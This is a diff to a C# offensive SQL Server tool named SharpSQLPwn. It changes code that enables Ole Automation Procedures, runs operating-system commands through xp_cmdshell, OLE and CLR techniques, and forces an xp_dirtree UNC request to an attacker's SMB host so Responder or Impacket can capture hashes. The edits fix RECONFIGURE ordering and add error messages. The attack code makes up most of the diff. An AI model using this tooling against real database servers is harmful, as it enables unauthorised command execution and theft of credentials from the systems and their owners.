@@ -140,7 +140,8 @@ namespace SharpSQLPwn.Utilities
                 try
                 {
                     Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine("[+] Currently logged in as: ");
+                    Console.WriteLine("[+] Impersonation successful!");
+                    Console.WriteLine("[+] Current user: ");
                     Console.ResetColor();
                     QuerySQL(con, "SELECT SYSTEM_USER;", true);
 
@@ -163,7 +164,7 @@ namespace SharpSQLPwn.Utilities
             if (cmdExec_command != "")
             {
                 Console.ForegroundColor = ConsoleColor.Blue;
-                Console.Write("[*] Trying to execute commands using chosen technique: 1 for xp_cmdshell, 2 for Ole Automation Procedures, 3 for DLL assembly: ");
+                Console.Write("[*] Trying to execute commands");
                 Console.ResetColor();
 
                 if (cmdExec_tech == 1)
@@ -196,7 +197,7 @@ namespace SharpSQLPwn.Utilities
                     Console.ForegroundColor = ConsoleColor.Cyan;
                     Console.WriteLine("[*] Trying technique-2 by enabling Ole Automation Procedures procedure if disabled ...");
                     Console.ResetColor();
-                    String enable_ole_proc = "EXEC sp_configure 'show advanced options', 1; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
+                    String enable_ole_proc = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                     QuerySQL(con, enable_ole_proc, false);
 
                     Console.ForegroundColor = ConsoleColor.Green;
@@ -209,7 +210,7 @@ namespace SharpSQLPwn.Utilities
                     Console.WriteLine("[*] Cleaning up, running sp_OADestroy on created procedure, and disabling Ole Automation Procedures ...");
                     Console.ResetColor();
                     String destroy_oa = "EXEC sp_OADestroy @myshell;";
-                    String disable_ole_proc = "EXEC sp_configure 'Ole Automation Procedures', 0; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;";
+                    String disable_ole_proc = "EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;";
                     QuerySQL(con, destroy_oa, true);
                     QuerySQL(con, disable_ole_proc, true);
                 }
@@ -247,6 +248,12 @@ namespace SharpSQLPwn.Utilities
                     QuerySQL(con, disable_clr, false);
                 }
             }
+            else
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("[-] Please specify the command to execute");
+                Console.ResetColor();
+            }
         }
 
         public static void UNCPathInjection(SqlConnection con, string smb_ip)
@@ -261,7 +268,13 @@ namespace SharpSQLPwn.Utilities
                 String smbquery = "EXEC master..xp_dirtree \"\\\\" + smb_ip + "\\test\";";
                 QuerySQL(con, smbquery, false);
                 Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("[+] Please check Responder/Impacket interface on Kali");
+                Console.WriteLine("[+] Please check Responder/Impacket interface on attacker's machine");
+                Console.ResetColor();
+            }
+            else
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("[-] Please specify the local attacker's machine");
                 Console.ResetColor();
             }
         }
